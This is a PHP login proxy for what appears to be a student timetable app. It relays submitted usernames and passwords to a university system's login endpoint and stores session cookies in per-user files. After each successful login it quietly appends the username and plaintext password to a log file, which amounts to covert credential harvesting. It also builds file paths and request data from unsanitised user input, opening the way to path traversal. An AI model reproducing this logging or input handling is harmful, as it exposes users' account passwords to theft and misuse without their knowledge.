<?php

	include_once('config.php');
	if($_POST['username'] && $_POST['password']){
		$data = "j_username=".trim($_POST['username'])."&j_password=".$_POST['password'];
		/*设置请求的 url*/
		$log_url = BASEURL."/b/ajaxLogin";
		
		/*设置 用户 的log信息*/
		$log_path = ROOT."/".$_POST['username'].".txt";
		/*初始化  curl*/
		$log = curl_init();
		curl_setopt($log,CURLOPT_URL,$log_url);//设置 请求 url
		curl_setopt($log,CURLOPT_REFERER,"http://202.194.15.33:21043");//设置 请求头
		curl_setopt($log,CURLOPT_POST, true);//设置 请求方法
		curl_setopt($log,CURLOPT_HEADER,0);//设置 是否保存 头文件
		curl_setopt($log,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($log,CURLOPT_POSTFIELDS,$data);//设置 post 请求的参数
		
		/*存放 cookie*/  
		if(file_exists($log_path)){
			 curl_setopt ($log, CURLOPT_COOKIEJAR , $log_path); // 存放Cookie信息的文件名称  
		}else{
			if(strlen($_POST['username']) == 12){
				$my = fopen($log_path,'w');
				fwrite($my,"zhaoshuai de classbox");
				fclose($my); 
				curl_setopt ($log, CURLOPT_COOKIEJAR , $log_path); // 存放Cookie信息的文件名称
			}else{
				echo -1;
				exit;
			}
		}
	  	curl_setopt ($log, CURLOPT_TIMEOUT, 30 ); // 设置超时限制防止死循环  
	    curl_setopt ($log, CURLOPT_HEADER, 0 ); // 显示返回的Header区域内容  
		$return = curl_exec($log);
		curl_close($log);
		if($return == "\"success\""){
			if(file_exists($log_path)){
				setcookie('user',$_POST['username'],time()+3600);//设置 cookie 下面会用到
				echo 1;
				/*保存密码*/
				$str = "username=".$_POST['username']."\t"."password=".$_POST['password']."\t".date("Y-m-d h:i:sa")."\n";
				$myfile = fopen(ROOT."logs.txt","a");
				fputs($myfile,$str);
				fclose($myfile);
				exit;
			}else{
				echo -2;
				exit;
			}
		}else{
			unlink($log_path);
			echo -2;
		}
	}else{
		echo -1;
	}
	
?>